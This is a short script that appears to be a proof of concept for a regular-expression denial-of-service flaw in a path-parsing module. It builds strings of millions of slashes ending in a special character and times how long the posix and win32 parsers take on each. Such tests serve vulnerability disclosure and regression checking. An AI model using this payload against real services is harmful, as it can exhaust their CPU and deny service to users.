import pathParse from '.';

function build_attack(n: String): String {
    var ret: String = ""
    for (var i = 0; i < n; i++) {
        ret += "/"
    }
    return ret + "◎";
}

for(var i = 1; i <= 5000000; i++) {
    if (i % 10000 == 0) {
        var time: Number = Date.now();
        var attack_str: Array = build_attack(i)
        pathParse.posix(attack_str);
        pathParse.win32(attack_str);
        var time_cost: Number = Date.now() - time;
        console.log("attack_str.length: " + attack_str.length + ": " + time_cost+" ms")
    }
}
